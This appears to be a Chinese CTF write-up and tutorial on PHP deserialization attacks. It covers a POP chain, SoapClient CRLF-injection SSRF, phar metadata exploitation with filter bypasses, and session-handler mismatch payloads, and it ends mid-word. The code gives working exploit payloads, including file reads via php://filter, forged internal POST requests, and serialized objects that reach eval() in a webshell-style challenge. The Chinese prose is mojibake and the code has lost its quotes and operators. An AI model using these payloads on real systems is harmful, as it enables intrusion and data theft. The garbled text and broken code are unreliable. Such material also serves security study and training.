åˆ©ç”¨POPé“¾ç®€å•ä»‹ç»å‰é¢æ‰€è®²è§£çš„åºåˆ—åŒ–æ”»å‡»æ›´å¤šçš„æ˜¯é­”æœ¯æ–¹æ³•ä¸­å‡ºç°ä¸€äº›åˆ©ç”¨çš„æ¼æ´ï¼Œå› ä¸ºè‡ªåŠ¨è°ƒç”¨è€Œè§¦å‘æ¼æ´ï¼Œä½†å¦‚æœå…³é”®ä»£ç ä¸åœ¨é­”æœ¯æ–¹æ³•ä¸­ï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªç±»çš„æ™®é€šæ–¹æ³•ä¸­ã€‚è¿™æ—¶å€™å¯ä»¥é€šè¿‡å¯»æ‰¾ç›¸åŒçš„å‡½æ•°åå°†ç±»çš„å±æ€§å’Œæ•æ„Ÿå‡½æ•°çš„å±æ€§è”ç³»èµ·æ¥ ç®€å•æ¡ˆä¾‹è®²è§£é¦–å…ˆçœ‹çœ‹ç®€å•çš„MRCTF2020-Ezpop,ä¸å¸¦å¤§å®¶ä¸€ä¸€è¯»ä»£ç äº†ï¼Œè‡ªå·±è§£å†³ ?phpclass Modifier protected $var; public function append($value) include($value); public function __invoke() $this-append($this-var); class Show public $source; public $str; public function __construct($file=index.php) $this-source = $file; echo Welcome to .$this-source.br; public function __toString() return $this-str-source; public function __wakeup() if(preg_match(/gopher|http|file|ftp|https|dict|\\.\\./i, $this-source)) echo hacker; $this-source = index.php; class Test public $p; public function __construct() $this-p = array(); public function __get($key) $function = $this-p; return $function(); è¿™é‡Œæˆ‘ç›´æ¥è¯´åˆ©ç”¨æ€è·¯ï¼Œé¦–å…ˆé€†å‘åˆ†æï¼Œæˆ‘ä»¬æœ€ç»ˆæ˜¯å¸Œæœ›é€šè¿‡Modifierå½“ä¸­çš„appendæ–¹æ³•å®ç°æœ¬åœ°æ–‡ä»¶åŒ…å«è¯»å–æ–‡ä»¶ï¼Œå›æº¯åˆ°è°ƒç”¨å®ƒçš„__invokeï¼Œå½“æˆ‘ä»¬å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘,å‘ç°åœ¨Testç±»å½“ä¸­çš„__getæ–¹æ³•ï¼Œå†å›æº¯åˆ°Showå½“ä¸­çš„__toStringï¼Œå†å›æº¯åˆ°Showå½“ä¸­çš„__constructå½“ä¸­æœ‰echo $this-sourceå¯ä»¥è°ƒç”¨__toString å› æ­¤ä¸éš¾æ„é€ popé“¾ ?phpini_set(memory_limit,-1);class Modifier protected $var = php://filter/read=convert.base64-encode/resource=flag.php;class Show public $source; public $str; public function __construct($file) $this-source = $file; $this-str = new Test(); class Test public $p; public function __construct() $this-p = new Modifier(); $a = new Show(aaa);$a = new Show($a);echo urlencode(serialize($a)); PHPåŸç”Ÿç±»ååºåˆ—åŒ–åˆ©ç”¨SoapClientä»‹ç» ç»¼è¿°ï¼š phpåœ¨å®‰è£…php-soapæ‹“å±•åï¼Œå¯ä»¥ååºåˆ—åŒ–åŸç”Ÿç±»SoapClientï¼Œæ¥å‘é€http postè¯·æ±‚ã€‚ å¿…é¡»è°ƒç”¨SoapClientä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè§¦å‘SoapClientçš„__callé­”æœ¯æ–¹æ³•ã€‚ é€šè¿‡CRLFæ¥æ·»åŠ è¯·æ±‚ä½“ï¼šSoapClientå¯ä»¥æŒ‡å®šè¯·æ±‚çš„user-agentå¤´ï¼Œé€šè¿‡æ·»åŠ æ¢è¡Œç¬¦çš„å½¢å¼æ¥åŠ å…¥å…¶ä»–è¯·æ±‚å†…å®¹ SoapClienté‡‡ç”¨äº†HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ï¼Œå…¶é‡‡ç”¨äº†SOAPåè®®(SOAP æ˜¯ä¸€ç§ç®€å•çš„åŸºäº XML çš„åè®®,å®ƒä½¿åº”ç”¨ç¨‹åºé€šè¿‡ HTTP æ¥äº¤æ¢ä¿¡æ¯)ï¼Œå…¶æ¬¡æˆ‘ä»¬çŸ¥é“æŸä¸ªå®ä¾‹åŒ–çš„ç±»ï¼Œå¦‚æœå»è°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨__callæ–¹æ³•ï¼Œå…·ä½“è¯¦ç»†çš„ä¿¡æ¯å¤§å®¶å¯ä»¥å»æœç´¢å¼•æ“çœ‹çœ‹ï¼Œè¿™é‡Œä¸å†èµ˜è¿° åˆ©ç”¨æ–¹å¼ä¸‹é¢é¦–å…ˆåœ¨æˆ‘çš„VPSä¸Šé¢å¼€å¯ç›‘å¬nc -lvvp 9328 ?php$a = new SoapClient(null,array(uri=bbb, location=http://xxxx.xxx.xx:9328));$b = serialize($a);$c = unserialize($b);$c - not_a_function();//è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè®©SoapClientè°ƒç”¨__call è¿è¡Œä¸Šé¢çš„phpç¨‹åºï¼Œåœ¨æˆ‘çš„vpsä¸Šé¢å¥–ä¼šæ•è·ç›‘å¬ ä»ä¸Šé¢è¿™å¼ å›¾å¯ä»¥çœ‹åˆ°ï¼ŒSOAPActionå¤„æ˜¯æˆ‘ä»¬çš„å¯æ§å‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•æ³¨å…¥æˆ‘ä»¬è‡ªå·±æ¶æ„æ„é€ çš„CRLFå³æ’å…¥**\\r **ï¼Œåˆ©ç”¨æˆåŠŸï¼ ä½†æ˜¯è¿˜æœ‰ä¸ªé—®é¢˜æˆ‘ä»¬å†å‘é€POSTæ•°æ®çš„æ—¶å€™æ˜¯éœ€è¦éµå¾ªHTTPåè®®ï¼ŒæŒ‡å®šè¯·æ±‚å¤´Content-Type: applicationx-www-form-urlencodedä½†Content-Typeåœ¨SOAPActionçš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶Content-Type,ä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ® æ¥ä¸‹æ¥æˆ‘ä»¬å®éªŒä¸€ä¸‹ å®æˆ˜ååºåˆ—åŒ–æˆ‘ä»¬ä¼ å…¥çš„vipæ‰§è¡ŒgetFlagå‡½æ•°(è¿·æƒ‘äººçš„å‡½æ•°) ?phphighlight_file(__FILE__);$vip = unserialize($_GET[vip]);$vip-getFlag();//flag.php$xff = explode(,, $_SERVER[HTTP_X_FORWARDED_FOR]);array_pop($xff);$ip = array_pop($xff);â€‹â€‹if($ip!==127.0.0.1) die(error);else $token = $_POST[token]; if($token==ctfshow) file_put_contents(flag.txt,$flag); ç”±äºæœåŠ¡å™¨å¸¦æœ‰cloudfareä»£ç†ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡æœ¬åœ°æ„é€ XFFå¤´å®ç°ç»•è¿‡ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨SoapClientä¸CRLFå®ç°SSRFè®¿é—®127.0.0.1/flag.php,å³å¯ç»•è¿‡cloudfareä»£ç† ?php$target = http://127.0.0.1/flag.php;$post_string = token=ctfshow;$headers = array( X-Forwarded-For: 127.0.0.1,127.0.0.1, UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d);$b = new SoapClient(null,array(location = $target,user_agent=y4tacker^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string,uri = aaab));$aaa = serialize($b);$aaa = str_replace(^^,\\r ,$aaa);$aaa = str_replace(,,$aaa);echo urlencode($aaa); æ¥ä¸‹æ¥è®¿é—®flag.txtå³å¯ Pharååºåˆ—åŒ–pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataã€‚å½“å—å½±å“çš„æ–‡ä»¶æ“ä½œå‡½æ•°è°ƒç”¨pharæ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨ååºåˆ—åŒ–meta-dataå†…çš„å†…å®¹ã€‚ ä»€ä¹ˆæ˜¯pharæ–‡ä»¶åœ¨è½¯ä»¶ä¸­ï¼ŒPHARï¼ˆPHPå½’æ¡£ï¼‰æ–‡ä»¶æ˜¯ä¸€ç§æ‰“åŒ…æ ¼å¼ï¼Œé€šè¿‡å°†è®¸å¤šPHPä»£ç æ–‡ä»¶å’Œå…¶ä»–èµ„æºï¼ˆä¾‹å¦‚å›¾åƒï¼Œæ ·å¼è¡¨ç­‰ï¼‰æ†ç»‘åˆ°ä¸€ä¸ªå½’æ¡£æ–‡ä»¶ä¸­æ¥å®ç°åº”ç”¨ç¨‹åºå’Œåº“çš„åˆ†å‘ phpé€šè¿‡ç”¨æˆ·å®šä¹‰å’Œå†…ç½®çš„â€œæµåŒ…è£…å™¨â€å®ç°å¤æ‚çš„æ–‡ä»¶å¤„ç†åŠŸèƒ½ã€‚å†…ç½®åŒ…è£…å™¨å¯ç”¨äºæ–‡ä»¶ç³»ç»Ÿå‡½æ•°ï¼Œå¦‚(fopen(),copy(),file_exists()å’Œfilesize()ã€‚ phar:å°±æ˜¯ä¸€ç§å†…ç½®çš„æµåŒ…è£…å™¨ã€‚ phpä¸­ä¸€äº›å¸¸è§çš„æµåŒ…è£…å™¨å¦‚ä¸‹ï¼š file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨ç”¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°æ—¶é»˜è®¤å°±ä½¿ç”¨è¯¥åŒ…è£…å™¨http:// â€” è®¿é—® HTTP(s) ç½‘å€ftp:// â€” è®¿é—® FTP(s) URLsphp:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰zlib:// â€” å‹ç¼©æµdata:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼phar:// â€” PHP å½’æ¡£ssh2:// â€” Secure Shell 2rar:// â€” RARogg:// â€” éŸ³é¢‘æµexpect:// â€” å¤„ç†äº¤äº’å¼çš„æµ pharæ–‡ä»¶çš„ç»“æ„stub:pharæ–‡ä»¶çš„æ ‡å¿—ï¼Œå¿…é¡»ä»¥ xxx __HALT_COMPILER();? ç»“å°¾ï¼Œå¦åˆ™æ— æ³•è¯†åˆ«ã€‚xxxå¯ä»¥ä¸ºè‡ªå®šä¹‰å†…å®¹ã€‚manifest:pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯æ¼æ´åˆ©ç”¨æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚content:è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹signature (å¯ç©º):ç­¾åï¼Œæ”¾åœ¨æœ«å°¾ã€‚ å¦‚ä½•ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ï¼Ÿä¸‹é¢ç»™å‡ºä¸€ä¸ªå‚è€ƒä¾‹å­ ?php class Test @unlink(phar.phar); $phar = new Phar(phar.phar); //åç¼€åå¿…é¡»ä¸ºphar $phar-startBuffering(); $phar-setStub(?php __HALT_COMPILER(); ?); //è®¾ç½®stub $o = new Test(); $phar-setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-addFromString(test.txt, test); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-stopBuffering();? æ¼æ´åˆ©ç”¨æ¡ä»¶ pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚ è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚ æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ å—å½±å“çš„å‡½æ•°çŸ¥é“åˆ›å®‡æµ‹è¯•åå—å½±å“çš„å‡½æ•°åˆ—è¡¨ï¼š å®é™…ä¸Šä¸æ­¢è¿™äº›ï¼Œä¹Ÿå¯ä»¥å‚è€ƒè¿™ç¯‡é“¾æ¥ï¼Œé‡Œé¢æœ‰è¯¦ç»†è¯´æ˜https://blog.zsxsoft.com/post/38 å½“ç„¶ä¸ºäº†é˜…è¯»æ–¹ä¾¿ï¼Œè¿™é‡Œä¾¿æŠŠå®ƒæ•´ç†è¿‡æ¥ //exifexif_thumbnailexif_imagetype //gdimageloadfontimagecreatefrom***ç³»åˆ—å‡½æ•° //hash hash_hmac_filehash_filehash_update_filemd5_filesha1_file // file/urlget_meta_tagsget_headers //standard getimagesizegetimagesizefromstring // zip $zip = new ZipArchive();$res = $zip-open(c.zip);$zip-extractTo(phar://test.phar/test);// Bzip / Gzip å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œã€‚å¯ä»¥ä½¿ç”¨compress.bzip2://å’Œcompress.zlib://ç»•è¿‡$z = compress.bzip2://phar:///home/sx/test.phar/test.txt;$z = compress.zlib://phar:///home/sx/test.phar/test.txt;//é…åˆå…¶ä»–åè®®ï¼š(SUCTF)//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d///å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œï¼Œè¿˜å¯ä»¥é…åˆå…¶ä»–åè®®è¿›è¡Œåˆ©ç”¨ã€‚//php://filter/read=convert.base64-encode/resource=phar://phar.phar//Postgres pgsqlCopyToFileå’Œpg_traceåŒæ ·ä¹Ÿæ˜¯èƒ½ä½¿ç”¨çš„ï¼Œéœ€è¦å¼€å¯pharçš„å†™åŠŸèƒ½ã€‚?php $pdo = new PDO(sprintf(pgsql:host=%s;dbname=%s;user=%s;password=%s, 127.0.0.1, postgres, sx, 123456)); @$pdo-pgsqlCopyFromFile(aa, phar://phar.phar/aa);? // Mysql//LOAD DATA LOCAL INFILEä¹Ÿä¼šè§¦å‘è¿™ä¸ªphp_stream_open_wrapper//é…ç½®ä¸€ä¸‹mysqld://[mysqld]//local-infile=1//secure_file_priv= ?phpclass A public $s = ; public function __wakeup () system($this-s); $m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, localhost, root, root, testtable, 3306);$p = mysqli_query($m, LOAD DATA LOCAL INFILE \\phar://test.phar/test\\ INTO TABLE a LINES TERMINATED BY \\\\r \\ IGNORE 1 LINES;);? ç»•è¿‡æ–¹å¼å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œã€‚å¯ä»¥ä½¿ç”¨compress.bzip2://å’Œcompress.zlib://ç­‰ç»•è¿‡ compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txt å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œï¼Œè¿˜å¯ä»¥é…åˆå…¶ä»–åè®®è¿›è¡Œåˆ©ç”¨ã€‚php:filterreadconvert.base64-encoderesourcephar:phar.phar GIFæ ¼å¼éªŒè¯å¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ GIF89aç»•è¿‡1ã€$phar-setStub(â€œGIF89aâ€.â€â€); è®¾ç½®stub2ã€ç”Ÿæˆä¸€ä¸ªphar.pharï¼Œä¿®æ”¹åç¼€åä¸ºphar.gif php-sessionååºåˆ—åŒ–sessionç®€å•ä»‹ç»åœ¨è®¡ç®—æœºä¸­ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€ã€‚Session å¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„ Web é¡µä¹‹é—´è·³è½¬æ—¶ï¼Œå­˜å‚¨åœ¨ Session å¯¹è±¡ä¸­çš„å˜é‡å°†ä¸ä¼šä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€ç›´å­˜åœ¨ä¸‹å»ã€‚å½“ç”¨æˆ·è¯·æ±‚æ¥è‡ªåº”ç”¨ç¨‹åºçš„ Web é¡µæ—¶ï¼Œå¦‚æœè¯¥ç”¨æˆ·è¿˜æ²¡æœ‰ä¼šè¯ï¼Œåˆ™ Web æœåŠ¡å™¨å°†è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª Session å¯¹è±¡ã€‚å½“ä¼šè¯è¿‡æœŸæˆ–è¢«æ”¾å¼ƒåï¼ŒæœåŠ¡å™¨å°†ç»ˆæ­¢è¯¥ä¼šè¯ã€‚ å½“ç¬¬ä¸€æ¬¡è®¿é—®ç½‘ç«™æ—¶ï¼ŒSeesion_start()å‡½æ•°å°±ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„Session IDï¼Œå¹¶è‡ªåŠ¨é€šè¿‡HTTPçš„å“åº”å¤´ï¼Œå°†è¿™ä¸ªSession IDä¿å­˜åˆ°å®¢æˆ·ç«¯Cookieä¸­ã€‚åŒæ—¶ï¼Œä¹Ÿåœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªä»¥Session IDå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºä¿å­˜è¿™ä¸ªç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚å½“åŒä¸€ä¸ªç”¨æˆ·å†æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™æ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨é€šè¿‡HTTPçš„è¯·æ±‚å¤´å°†Cookieä¸­ä¿å­˜çš„Seesion IDå†æºå¸¦è¿‡æ¥ï¼Œè¿™æ—¶Session_start()å‡½æ•°å°±ä¸ä¼šå†å»åˆ†é…ä¸€ä¸ªæ–°çš„Session IDï¼Œè€Œæ˜¯åœ¨æœåŠ¡å™¨çš„ç¡¬ç›˜ä¸­å»å¯»æ‰¾å’Œè¿™ä¸ªSession IDåŒåçš„Sessionæ–‡ä»¶ï¼Œå°†è¿™ä¹‹å‰ä¸ºè¿™ä¸ªç”¨æˆ·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯è¯»å‡ºï¼Œåœ¨å½“å‰è„šæœ¬ä¸­åº”ç”¨ï¼Œè¾¾åˆ°è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·çš„ç›®çš„ã€‚ session çš„å­˜å‚¨æœºåˆ¶phpä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ php_serialize ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–æ•°ç»„ php é”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°å¤„ç†çš„å€¼ php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+serialize()å‡½æ•°åºåˆ—åŒ–çš„å€¼ php.iniä¸­ä¸€äº›sessioné…ç½® session.save_pathâ€â€ â€“è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„session.save_handlerâ€â€â€“è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)session.auto_start boolenâ€“æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯é»˜è®¤ä¸º0ä¸å¯åŠ¨session.serialize_handler stringâ€“å®šä¹‰ç”¨æ¥åºåˆ—åŒ–ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php åˆ©ç”¨å§¿åŠ¿session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€è¿™ç¯‡æ–‡ç« è¯´çš„å¾ˆè¯¦ç»†äº†ï¼Œæ²¡å¿…è¦ç­é—¨å¼„æ–§ https://www.freebuf.com/vuls/202819.html ä½¿ç”¨ä¸åŒçš„å¼•æ“æ¥å¤„ç†sessionæ–‡ä»¶$_SESSIONå˜é‡ç›´æ¥å¯æ§phpå¼•æ“çš„å­˜å‚¨æ ¼å¼æ˜¯é”®å|serialized_stringï¼Œè€Œphp_serializeå¼•æ“çš„å­˜å‚¨æ ¼å¼æ˜¯serialized_stringã€‚å¦‚æœç¨‹åºä½¿ç”¨ä¸¤ä¸ªå¼•æ“æ¥åˆ†åˆ«å¤„ç†çš„è¯å°±ä¼šå‡ºç°é—®é¢˜ æ¥çœ‹çœ‹è¿™ä¸¤ä¸ªphp // 1.php?phpini_set(session.serialize_handler, php_serialize);session_start();$_SESSION[y4] = $_GET[a];var_dump($_SESSION);//2.php?phpini_set(session.serialize_handler, php);session_start();class test public $name; function __wakeup() echo $this-name; é¦–å…ˆè®¿é—®1.phpï¼Œä¼ å…¥å‚æ•°a=|O:4:test:1:{s:4:name;s:8:y4tacker;}å†è®¿é—®2.phpï¼Œæ³¨æ„ä¸è¦å¿˜è®°| ç”±äº1.phpæ˜¯ä½¿ç”¨php_serializeå¼•æ“å¤„ç†ï¼Œå› æ­¤åªä¼šæŠŠ|å½“åšä¸€ä¸ªæ­£å¸¸çš„å­—ç¬¦ã€‚ç„¶åè®¿é—®2.phpï¼Œç”±äºç”¨çš„æ˜¯phpå¼•æ“ï¼Œå› æ­¤é‡åˆ°|æ—¶ä¼šå°†ä¹‹çœ‹åšé”®åä¸å€¼çš„åˆ†å‰²ç¬¦ï¼Œä»è€Œé€ æˆäº†æ­§ä¹‰ï¼Œå¯¼è‡´å…¶åœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹|åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ã€‚ è¿™é‡Œå¯èƒ½ä¼šæœ‰ä¸€ä¸ªå°ç–‘é—®ï¼Œä¸ºä»€ä¹ˆåœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹|åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯å¤„ç†å™¨çš„åŠŸèƒ½ï¼Ÿè¿™ä¸ªå…¶å®æ˜¯å› ä¸ºsession_start()è¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥çœ‹ä¸‹å®˜æ–¹è¯´æ˜ï¼š å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡ session_start() æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œ PHP å†…éƒ¨ä¼šè°ƒç”¨ä¼šè¯ç®¡ç†å™¨çš„ open å’Œ read å›è°ƒå‡½æ•°ã€‚ ä¼šè¯ç®¡ç†å™¨å¯èƒ½æ˜¯ PHP é»˜è®¤çš„ï¼Œ ä¹Ÿå¯èƒ½æ˜¯æ‰©å±•æä¾›çš„ï¼ˆSQLite æˆ–è€… Memcached æ‰©å±•ï¼‰ï¼Œ ä¹Ÿå¯èƒ½æ˜¯é€šè¿‡ session_set_save_handler() è®¾å®šçš„ç”¨æˆ·è‡ªå®šä¹‰ä¼šè¯ç®¡ç†å™¨ã€‚ é€šè¿‡ read å›è°ƒå‡½æ•°è¿”å›çš„ç°æœ‰ä¼šè¯æ•°æ®ï¼ˆä½¿ç”¨ç‰¹æ®Šçš„åºåˆ—åŒ–æ ¼å¼å­˜å‚¨ï¼‰ï¼ŒPHP ä¼šè‡ªåŠ¨ååºåˆ—åŒ–æ•°æ®å¹¶ä¸”å¡«å…… $_SESSION è¶…çº§å…¨å±€å˜é‡ å› æ­¤æˆ‘ä»¬æˆåŠŸè§¦å‘äº†testç±»ä¸­çš„__wakeup()æ–¹æ³•,æ‰€ä»¥è¿™ç§æ”»å‡»æ€è·¯æ˜¯å¯è¡Œçš„ã€‚ä½†è¿™ç§æ–¹æ³•æ˜¯åœ¨å¯ä»¥å¯¹sessionçš„è¿›è¡Œèµ‹å€¼çš„ï¼Œé‚£å¦‚æœä»£ç ä¸­ä¸å­˜åœ¨å¯¹$_SESSIONå˜é‡èµ‹å€¼çš„æƒ…å†µä¸‹åˆè¯¥å¦‚ä½•åˆ©ç”¨ $_SESSIONå˜é‡ç›´æ¥ä¸å¯æ§æˆ‘ä»¬æ¥çœ‹é«˜æ ¡æˆ˜ç–«çš„ä¸€é“CTFé¢˜ç›® ?php//A webshell is wait for youini_set(session.serialize_handler, php);session_start();class OowoO public $mdzz; function __construct() $this-mdzz = phpinfo();; function __destruct() eval($this-mdzz); if(isset($_GET[phpinfo])) $m = new OowoO();else highlight_string(file_get_contents(index.php));? æˆ‘ä»¬æ³¨æ„åˆ°è¿™æ ·ä¸€å¥è¯ini_set(session.serialize_handler, php);ï¼Œå› æ­¤ä¸éš¾çŒœæµ‹æœ¬èº«åœ¨php.iniå½“ä¸­çš„è®¾ç½®å¯èƒ½æ˜¯php_serializeï¼Œåœ¨æŸ¥çœ‹äº†phpinfoåå¾—è¯çŒœæµ‹æ­£ç¡®ï¼Œä¹ŸçŸ¥é“äº†è¿™é“é¢˜çš„è€ƒç‚¹ é‚£ä¹ˆæˆ‘ä»¬å°±è¿›å…¥phpinfoæŸ¥çœ‹ä¸€ä¸‹ï¼Œenabledonè¡¨ç¤ºupload_progressåŠŸèƒ½å¼€å§‹ï¼Œä¹Ÿæ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ï¼›åªéœ€å¾€è¯¥åœ°å€ä»»æ„ POST ä¸€ä¸ªåä¸º PHP_SESSION_UPLOAD_PROGRESS çš„å­—æ®µï¼Œå°±å¯ä»¥å°†filenameçš„å€¼èµ‹å€¼åˆ°sessionä¸­ æ„é€ æ–‡ä»¶ä¸Šä¼ çš„è¡¨å• form action=http://web.jarvisoj.com:32784/index.php method=POST enctype=multipart/form-data input type=hidden name=777 / input type=file name=file / input type=submit //form æ¥ä¸‹æ¥æ„é€ åºåˆ—åŒ–payload ?phpini_set(session.serialize_handler, php_serialize);session_start();class OowoO public $mdzz=print_r(scandir(dirname(__FILE__)));;$obj = new OowoO();echo serialize($obj);? ç”±äºé‡‡ç”¨Burpå‘åŒ…ï¼Œä¸ºé˜²æ­¢åŒå¼•å·è¢«è½¬ä¹‰ï¼Œåœ¨åŒå¼•å·å‰åŠ ä¸Š\\ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜è¦åŠ ä¸Š| åœ¨è¿™ä¸ªé¡µé¢éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åæŠ“åŒ…ä¿®æ”¹filenameçš„å€¼ å¯ä»¥çœ‹åˆ°Here_1s_7he_fl4g_buT_You_Cannot_see.phpè¿™ä¸ªæ–‡ä»¶ï¼Œflagè‚¯å®šåœ¨é‡Œé¢ï¼Œä½†è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ä¸çŸ¥é“è¿™ä¸ªè·¯å¾„ï¼Œè·¯å¾„çš„é—®é¢˜å°±éœ€è¦å›åˆ°phpinfoé¡µé¢å»æŸ¥çœ‹ å› 